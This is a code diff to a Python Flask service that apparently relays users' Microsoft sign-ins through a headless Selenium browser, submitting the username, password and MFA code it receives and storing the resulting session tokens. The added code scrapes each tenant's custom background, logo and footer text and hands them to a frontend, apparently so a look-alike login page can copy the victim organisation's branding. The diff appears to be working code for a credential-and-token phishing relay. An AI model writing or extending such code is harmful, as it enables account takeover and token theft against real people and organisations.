@@ -116,6 +116,9 @@ class LoginSession:
     federated_domain: Optional[str] = None
     error: Optional[str] = None
     tokens: Optional[dict] = None
+    background_image: Optional[str] = None
+    logo: Optional[str] = None
+    footer_text: Optional[str] = None
     lock: threading.Lock = field(default_factory=threading.Lock)
 
 
@@ -168,6 +171,71 @@ def _quit_driver_safely(driver) -> None:
         driver.quit()
     except Exception:
         pass
+
+
+def _capture_branding(driver) -> dict:
+    """
+    Best-effort scrape of the tenant's custom branding from Microsoft's own
+    login page: the background image, the company logo, and any footer/
+    boilerplate text (e.g. "contact support at ..."). Every field is None
+    if not found — the frontend only renders what's actually present.
+    """
+    try:
+        result = driver.execute_script("""
+            const out = { background_image: null, logo: null, footer_text: null };
+
+            // Background image: same detection as before.
+            const bannerLogo = document.getElementById('bannerLogo');
+            if (bannerLogo && bannerLogo.src) {
+                out.logo = bannerLogo.src;
+            }
+
+            const images = document.querySelectorAll('img');
+            if (!out.logo) {
+                for (let img of images) {
+                    const id = img.id || '';
+                    const className = img.className || '';
+                    if ((id.includes('banner') || className.includes('banner')) && img.src) {
+                        out.logo = img.src;
+                        break;
+                    }
+                }
+            }
+
+            const allElements = document.querySelectorAll('*');
+            for (let el of allElements) {
+                const bg = window.getComputedStyle(el).backgroundImage;
+                if (bg && bg !== 'none' && bg.includes('url(')) {
+                    const match = bg.match(/url\\(['\"]?(.+?)['\"]?\\)/);
+                    if (match && match[1]) {
+                        out.background_image = match[1];
+                        break;
+                    }
+                }
+            }
+
+            // Footer / boilerplate text (tenant-configured support contact,
+            // terms links, etc). Microsoft renders this as custom sign-in
+            // page text, most reliably found at #footerTextContent (a leaf
+            // div holding just that string) or #idBoilerPlateText. Capped at
+            // 200 chars and required to be a leaf-ish node (no nested form
+            // controls) so a broad fallback selector can't accidentally
+            // sweep up the whole page's text.
+            const footerCandidateIds = ['footerTextContent', 'idBoilerPlateText', 'idDiv_SAOTCC_Title'];
+            for (const id of footerCandidateIds) {
+                const el = document.getElementById(id);
+                const text = el && el.innerText && el.innerText.trim();
+                if (text && text.length <= 200 && !el.querySelector('input, button, form')) {
+                    out.footer_text = text;
+                    break;
+                }
+            }
+
+            return out;
+        """)
+        return result or {}
+    except Exception:
+        return {}
 
 
 def _username_error_text(driver) -> Optional[str]:
@@ -372,7 +440,9 @@ def _run_password_job(username: str, password: str):
 
     driver = session.selauth.driver
 
+    # Wait for password field to appear
     els = WebDriverWait(driver, STEP_TIMEOUT).until(lambda d: d.find_element(By.ID, "i0118"))
+
     els.send_keys(password)
 
     submit = WebDriverWait(driver, STEP_TIMEOUT).until(lambda d: d.find_element(By.ID, "idSIButton9"))
@@ -493,6 +563,8 @@ def login_username():
 
     federated_domain = _is_federated_redirect(driver)
 
+    branding = {} if federated_domain else _capture_branding(driver)
+
     with _sessions_lock:
         _sessions[username] = LoginSession(
             selauth=selauth,
@@ -500,6 +572,9 @@ def login_username():
             created_at=time.time(),
             stage=Stage.AWAITING_ORG_LOGIN if federated_domain else Stage.ENTERING_PASSWORD,
             federated_domain=federated_domain,
+            background_image=branding.get("background_image"),
+            logo=branding.get("logo"),
+            footer_text=branding.get("footer_text"),
         )
 
     return jsonify({
@@ -508,6 +583,9 @@ def login_username():
         "status": "awaiting_password",
         "flow": "federated" if federated_domain else "microsoft",
         "federated_domain": federated_domain,
+        "background_image": branding.get("background_image"),
+        "logo": branding.get("logo"),
+        "footer_text": branding.get("footer_text"),
     })
 
 
@@ -587,6 +665,9 @@ def login_status(username):
             "federated_domain": session.federated_domain,
             "error": session.error,
             "tokens": session.tokens,
+            "background_image": session.background_image,
+            "logo": session.logo,
+            "footer_text": session.footer_text,
         }
 
     if session.stage in (Stage.SUCCEEDED, Stage.FAILED):
@@ -673,4 +754,4 @@ def login_mfa_code():
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5050)), debug=False)
